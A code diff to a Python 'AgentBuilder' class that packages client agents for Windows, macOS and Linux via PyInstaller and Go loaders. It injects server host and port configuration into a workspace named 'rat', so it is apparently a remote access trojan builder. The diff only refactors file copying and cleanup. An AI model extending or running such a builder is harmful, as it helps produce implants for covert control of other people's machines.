@@ -18,6 +18,9 @@ class AgentBuilder:
     EXCLUDE_EXTENSIONS = {'.pyc', '.pyo', '.pyd'}
     EXCLUDE_FILE_PATTERNS = {'nohup.out', 'nohup.out.*'}
     BUNDLE_INCLUDE_PATHS = CLIENT_BUNDLE_SOURCE_PATHS
+    PYINSTALLER_INCLUDE_PATHS = BUNDLE_INCLUDE_PATHS
+    GO_INCLUDE_PATHS = ('client-go',)
+    GO_LOADER_INCLUDE_PATHS = ('go-loader',)
     SUPPORTED_TARGETS = {'win', 'mac', 'linux'}
     SUPPORTED_BUILDERS = {'pyinstaller', 'go', 'go_loader', 'bundle'}
     SUPPORTED_GO_ARCHES = {'amd64', 'arm64'}
@@ -34,8 +37,8 @@ class AgentBuilder:
     }
 
     def __init__(self):
-        self.source_dir = os.path.abspath('.')
-        self.output_dir = os.path.abspath(os.path.join('runtime', 'agent_output'))
+        self.source_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
+        self.output_dir = os.path.join(self.source_dir, 'runtime', 'agent_output')
         self._ensure_dirs()
 
     def _ensure_dirs(self):
@@ -164,27 +167,38 @@ class AgentBuilder:
                 'file_path': output_path,
                 'file_name': result['file_name'],
                 'size': os.path.getsize(output_path),
-                'work_dir': work_dir,
                 'builder': builder,
                 'target_os': result.get('target_os', target_os),
                 'warnings': warnings,
                 'target_arch': result.get('target_arch', target_arch or 'n/a'),
                 'build_version': build_version,
             }
-        except Exception:
+        finally:
             shutil.rmtree(work_dir, ignore_errors=True)
-            raise
 
-    def _copy_source_with_excludes(self, src: str, dst: str):
-        shutil.copytree(
-            src, dst,
-            ignore=shutil.ignore_patterns(
-                *[f'*/{d}' for d in self.EXCLUDE_DIRS],
-                *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS],
-                *self.EXCLUDE_FILE_PATTERNS,
-            ),
-            ignore_dangling_symlinks=True
+    def _copy_source_paths(self, relative_paths, dst: str):
+        os.makedirs(dst, exist_ok=True)
+        ignore = shutil.ignore_patterns(
+            *self.EXCLUDE_DIRS,
+            *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS],
+            *self.EXCLUDE_FILE_PATTERNS,
         )
+        for relative_path in relative_paths:
+            source_path = os.path.join(self.source_dir, relative_path)
+            if not os.path.exists(source_path):
+                raise FileNotFoundError(f'Build source not found: {relative_path}')
+            target_path = os.path.join(dst, relative_path)
+            if os.path.isdir(source_path):
+                os.makedirs(os.path.dirname(target_path), exist_ok=True)
+                shutil.copytree(
+                    source_path,
+                    target_path,
+                    ignore=ignore,
+                    ignore_dangling_symlinks=True,
+                )
+            else:
+                os.makedirs(os.path.dirname(target_path), exist_ok=True)
+                shutil.copy2(source_path, target_path)
 
     def _inject_config(self, client_dir: str, server_host: str, server_port: int, web_port: int,
                        file_transfer_port: int,
@@ -269,7 +283,7 @@ const BundleReportAPIPath = "/api/agent/loader/report"
             )
 
         client_copy = os.path.join(work_dir, 'rat')
-        self._copy_source_with_excludes(self.source_dir, client_copy)
+        self._copy_source_paths(self.PYINSTALLER_INCLUDE_PATHS, client_copy)
         logger.info(f'Temporary workspace: {os.path.abspath(client_copy)}')
         self._inject_config(
             client_copy,
@@ -303,7 +317,7 @@ const BundleReportAPIPath = "/api/agent/loader/report"
             raise FileNotFoundError('client-go directory not found')
 
         client_copy = os.path.join(work_dir, 'rat')
-        self._copy_source_with_excludes(self.source_dir, client_copy)
+        self._copy_source_paths(self.GO_INCLUDE_PATHS, client_copy)
         logger.info(f'Temporary workspace: {os.path.abspath(client_copy)}')
         self._inject_go_config(
             client_copy,
@@ -338,7 +352,7 @@ const BundleReportAPIPath = "/api/agent/loader/report"
             raise FileNotFoundError('go-loader directory not found')
 
         client_copy = os.path.join(work_dir, 'rat')
-        self._copy_source_with_excludes(self.source_dir, client_copy)
+        self._copy_source_paths(self.GO_LOADER_INCLUDE_PATHS, client_copy)
         logger.info(f'Temporary workspace: {os.path.abspath(client_copy)}')
         self._inject_go_loader_config(
             client_copy,
@@ -380,22 +394,7 @@ const BundleReportAPIPath = "/api/agent/loader/report"
                            web_port: int, file_transfer_port: int, build_id: str, build_version: str,
                            server_web_scheme: str = 'http', server_web_host: str = '') -> dict:
         staging_dir = os.path.join(work_dir, 'bundle')
-        os.makedirs(staging_dir, exist_ok=True)
-        for relative_path in self.BUNDLE_INCLUDE_PATHS:
-            source_path = os.path.join(self.source_dir, relative_path)
-            if not os.path.exists(source_path):
-                raise FileNotFoundError(f'Bundle source not found: {relative_path}')
-            target_path = os.path.join(staging_dir, relative_path)
-            if os.path.isdir(source_path):
-                shutil.copytree(
-                    source_path,
-                    target_path,
-                    ignore=shutil.ignore_patterns(*self.EXCLUDE_DIRS, *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS]),
-                    ignore_dangling_symlinks=True,
-                )
-            else:
-                os.makedirs(os.path.dirname(target_path), exist_ok=True)
-                shutil.copy2(source_path, target_path)
+        self._copy_source_paths(self.BUNDLE_INCLUDE_PATHS, staging_dir)
 
         self._inject_config(
             staging_dir,
@@ -486,7 +485,3 @@ const BundleReportAPIPath = "/api/agent/loader/report"
     def _describe_target(self, target_os: str) -> str:
         mapping = {'win': 'Windows', 'mac': 'macOS', 'linux': 'Linux', 'bundle': 'Bundle'}
         return mapping.get(target_os, target_os)
-
-    def cleanup(self, work_dir: str):
-        if work_dir and os.path.exists(work_dir):
-            shutil.rmtree(work_dir, ignore_errors=True)
